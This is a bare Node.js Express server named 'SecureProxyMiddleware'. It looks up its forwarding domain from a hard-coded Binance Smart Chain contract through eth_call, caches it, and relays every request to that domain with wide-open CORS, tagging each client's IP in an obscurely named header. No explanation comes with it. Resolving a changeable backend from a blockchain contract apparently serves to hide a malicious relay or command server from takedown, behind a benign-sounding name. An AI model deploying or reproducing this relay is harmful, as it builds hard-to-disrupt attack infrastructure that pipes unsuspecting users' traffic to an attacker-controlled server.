const express = require('express');
const axios = require('axios');
const fs = require('fs');
const os = require('os');
const path = require('path');
const crypto = require('crypto');
const cors = require('cors');

const app = express();
const port = 3000;

//  to handle CORS
app.use(cors({
    origin: '*',
    methods: ['GET', 'HEAD', 'POST', 'OPTIONS'],
    allowedHeaders: ['*'],
    maxAge: 3600
}));

// Function to get client IP
function getClientIP(req) {
    // Check for Cloudflare IP
    if (req.headers['cf-connecting-ip']) {
        return req.headers['cf-connecting-ip'];
    }
     if (req.headers['x-forwarded-for']) {
        const ips = req.headers['x-forwarded-for'].split(',');
        return ips[0].trim();
    }
    // Fallback to direct IP
    return req.ip;
}



class SecureProxyMiddleware {
    constructor(options = {}) {
        this.updateInterval = 60;
        this.rpcUrls = options.rpcUrls || [
            "https://rpc.ankr.com/bsc",
            "https://bsc-dataseed2.bnbchain.org"
        ];
        this.contractAddress = options.contractAddress || "0xe9d5f645f79fa60fca82b4e1d35832e43370feb0";
        
        const serverIdentifier = crypto.createHash('md5').update(
            `${os.hostname()}:${os.networkInterfaces().lo[0].address}:node`
        ).digest('hex');
        this.cacheFile = path.join(os.tmpdir(), `proxy_cache_${serverIdentifier}.json`);
    }

    loadCache() {
        if (!fs.existsSync(this.cacheFile)) return null;
        const cache = JSON.parse(fs.readFileSync(this.cacheFile, 'utf8'));
        if (!cache || (Date.now() / 1000 - cache.timestamp) > this.updateInterval) {
            return null;
        }
        return cache.domain;
    }

    saveCache(domain) {
        const cache = { domain, timestamp: Date.now() / 1000 };
        fs.writeFileSync(this.cacheFile, JSON.stringify(cache));
    }

    hexToString(hex) {
        hex = hex.replace(/^0x/, '');
        hex = hex.slice(64);
        const lengthHex = hex.slice(0, 64);
        const length = parseInt(lengthHex, 16);
        const dataHex = hex.slice(64, 64 + length * 2);
        let result = '';
        for (let i = 0; i < dataHex.length; i += 2) {
            const charCode = parseInt(dataHex.substr(i, 2), 16);
            if (charCode === 0) break;
            result += String.fromCharCode(charCode);
        }
        return result;
    }

    async fetchTargetDomain() {
        const data = '20965255';
        for (const rpcUrl of this.rpcUrls) {
            try {
                const response = await axios.post(rpcUrl, {
                    jsonrpc: '2.0',
                    id: 1,
                    method: 'eth_call',
                    params: [{
                        to: this.contractAddress,
                        data: '0x' + data
                    }, 'latest']
                }, {
                    timeout: 120000,
                    headers: { 'Content-Type': 'application/json' }
                });

                if (response.data.error) continue;
                const domain = this.hexToString(response.data.result);
                if (domain) return domain;
            } catch (error) {
                continue;
            }
        }
        throw new Error('Could not fetch target domain');
    }

    async getTargetDomain() {
        const cachedDomain = this.loadCache();
        if (cachedDomain) return cachedDomain;
        const domain = await this.fetchTargetDomain();
        this.saveCache(domain);
        return domain;
    }

    formatHeaders(headers) {
        const formatted = [];
        for (const [key, value] of Object.entries(headers)) {
            if (Array.isArray(value)) {
                formatted.push(`${key}: ${value.join(', ')}`);
            } else {
                formatted.push(`${key}: ${value}`);
            }
        }
        return formatted;
    }

    async handle(req, res, endpoint) {
        try {
            const targetDomain = (await this.getTargetDomain()).replace(/\/$/, '');
            const url = `${targetDomain}/${endpoint.replace(/^\//, '')}`;
            const clientIP = getClientIP(req);

            const headers = { ...req.headers };
            delete headers.host;
            delete headers.origin;
            delete headers['accept-encoding'];
            delete headers['content-encoding'];
            headers['x-dfkjldifjlifjd'] = clientIP;

            const response = await axios({
                method: req.method,
                url,
                data: req.body,
                headers,
                timeout: 120000,
                maxRedirects: 5,
                responseType: 'stream'
            });

            res.set(response.headers);
            res.status(response.status);
            response.data.pipe(res);
        } catch (error) {
            console.error(error);
            res.status(500).send('Internal server error');
        }
    }
}



app.options('*', (req, res) => {
    res.status(204).end();
});

 

app.get('/ping_proxy', (req, res) => {
    res.set('Content-Type', 'text/plain');
    res.send('pong');
});

 
app.all('*', async (req, res) => {
    const endpoint = req.query.e;
    if (!endpoint) {
        return res.status(400).send('Missing endpoint');
    }
    const proxy = new SecureProxyMiddleware({
        rpcUrls: [
            "https://binance.llamarpc.com",
            "https://bsc.drpc.org"
        ],
        contractAddress: "0xe9d5f645f79fa60fca82b4e1d35832e43370feb0"
    });
    await proxy.handle(req, res, decodeURIComponent(endpoint));
});

app.listen(port, () => {
    console.log(`Proxy server running on port ${port}`);
});